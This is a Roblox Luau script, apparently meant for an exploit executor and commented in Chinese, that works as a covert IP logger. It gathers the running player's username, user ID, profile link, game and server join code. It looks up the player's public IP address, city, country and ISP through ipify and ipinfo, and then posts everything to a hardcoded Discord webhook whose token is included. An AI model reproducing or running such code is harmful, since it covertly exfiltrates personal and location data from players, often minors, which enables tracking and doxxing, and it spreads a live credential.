--// 服務初始化
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

--// 設定
local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
local gameName = "Unknown"
local embedColor = tonumber("0x00FF00" )

--// 新增: 指定應用圖片 (三眼怪)
local appIconURL = "https://i.ibb.co/fYSwfPm2/image.jpg"

--// 增強的 HTTP 請求函數
local function secureRequest(options )
    local requestFunc = request or http_request or (syn and syn.request )
    if requestFunc then
        local success, response = pcall(function() return requestFunc(options) end)
        if success and response then return response end
    end
    if options.Method == "GET" and game.HttpGetAsync then
         local success, responseBody = pcall(game.HttpGetAsync, game, options.Url)
         if success and responseBody then return { Body = responseBody, StatusCode = 200 } end
    end
    warn("所有 HTTP 請求方法均失敗。")
    return nil
end

--// 獲取 IP 和地理位置的函數
local function getSecretInfo()
    local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
    local ip
    for _, url in ipairs(ipServices ) do
        local response = secureRequest({ Url = url, Method = "GET" })
        if response and response.Body and #response.Body > 0 and not response.Body:find("[<>]") then
            ip = response.Body:gsub("%s+", "")
            break
        end
    end
    if not ip then return nil end
    local ipDetails
    local detailResponse = secureRequest({ Url = "https://ipinfo.io/" .. ip .. "/json", Method = "GET" } )
    if detailResponse and detailResponse.Body then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, detailResponse.Body)
        if success and type(decoded) == "table" then ipDetails = decoded end
    end
    return { ip = ip, details = ipDetails }
end

--// 主要執行邏輯
pcall(function()
    -- 1. 獲取遊戲名稱
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info.Name or "Unknown"
    end)

    -- 2. 獲取 IP 資訊
    local secretInfo = getSecretInfo()

    -- 3. 建立個人資料連結
    local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"

    -- 4. 準備第一個 embed (玩家資訊)
    local playerDescription = string.format(
        "**真實名稱:** `%s`\n" ..
        "**顯示名稱:** `%s`\n" ..
        "**玩家ID:** `%s`\n" ..
        "**個人資料:** [Roblox 個人頁面](%s)\n" ..
        "**遊戲:** `%s`\n" ..
        "**玩家伺服器人數:** `%d`\n" ..
        "**加入代碼:** `%s`",
        LocalPlayer.Name,
        LocalPlayer.DisplayName,
        tostring(LocalPlayer.UserId),
        profileUrl,
        gameName,
        #Players:GetPlayers(),
        game.JobId or "N/A"
    )
    
    local playerEmbed = {
        title = "Player Log:",
        description = playerDescription,
        color = embedColor,
        footer = {
            text = "三眼怪 ON TOP"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    -- 5. 準備一個 embeds 陣列，並將第一個 embed 加入
    local embeds = { playerEmbed }

    -- 6. 如果有 IP 資訊，則創建第二個 embed (IP 資訊) 並加入陣列
    if secretInfo and secretInfo.ip then
        local ip_info = secretInfo.details
        local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
        local isp = (ip_info and ip_info.org) or "未知"
        
        local ipDescription = string.format(
            "**IP 位址:** `%s`\n" ..
            "**推測位置:** `%s`\n" ..
            "**網路供應商:** `%s`",
            secretInfo.ip, location, isp
        )

        local ipEmbed = {
            title = "IP Log:", -- 這裡的 title 會和上面的 Player Log 一樣大
            description = ipDescription,
            color = embedColor -- 保持顏色一致
        }
        
        table.insert(embeds, ipEmbed)
    end

    -- 7. 構建並發送最終的 webhook 資料
    local data = {
        username = "三眼怪 Log V2",
        avatar_url = appIconURL,
        embeds = embeds -- 將包含一個或兩個 embed 的陣列發送出去
    }

    secureRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end)
